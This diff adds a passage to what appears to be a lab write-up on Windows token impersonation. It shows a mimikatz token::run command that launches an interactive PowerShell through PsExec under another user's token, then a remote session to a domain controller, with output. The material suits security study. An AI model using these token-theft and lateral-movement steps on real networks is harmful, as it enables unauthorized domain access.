@@ -138,6 +138,56 @@ Global Group memberships     *Domain Admins        *Domain Users
 The command completed successfully.
 ```
 
+It's not possible to directly start a new interactive PowerShell process,
+because the user input of a new process is somehow not handled correctly.
+However, when PowerShell is started via PsExec, it can be interactively used:
+
+```
+mimikatz # token::run /id:77132228 /process:"C:\tools\PsExec64.exe -accepteula -i powershell.exe"
+Token Id  : 77132228
+User name :
+SID name  :
+
+8544    {0;0498f042} 2 L 77132228       child\ffast     S-1-5-21-1345929560-157546789-2569868433-1123   (14g,05p)       Primary
+
+PsExec v2.4 - Execute processes remotely
+Copyright (C) 2001-2022 Mark Russinovich
+Sysinternals - www.sysinternals.com
+```
+
+A new PowerShell window is then opened wich can be used interactively:
+
+```
+PS C:\Windows\system32> whoami
+winattacklab\ffast
+
+S C:\Windows\system32> Enter-PSSession DC1
+[DC1]: PS C:\Users\ffast\Documents> hostname
+DC1
+[DC1]: PS C:\Users\ffast\Documents> whoami
+winattacklab\ffast
+[DC1]: PS C:\Users\ffast\Documents> ls \
+
+
+    Directory: C:\
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+d-----        5/31/2023   6:30 AM                AzureData
+d-----        5/31/2023   7:09 AM                ddns_server
+d-----        5/31/2023   7:04 AM                inetpub
+d-----        5/31/2023   6:46 AM                Packages
+d-----         5/5/2023  11:31 AM                PerfLogs
+d-r---        5/31/2023   7:04 AM                Program Files
+d-----         5/5/2023  12:26 PM                Program Files (x86)
+d-----        5/31/2023   7:10 AM                terraform
+d-r---        6/22/2023   1:02 PM                Users
+d-r---        6/20/2023   5:27 PM                Windows
+d-----        5/31/2023   6:33 AM                WindowsAzure
+d-----        5/31/2023   7:07 AM                WSUS
+```
+
 ## Demystifying the `kull_m_process_run_data` Error
 
 Even as a local administrator, you can get the `kull_m_process_run_data` error:
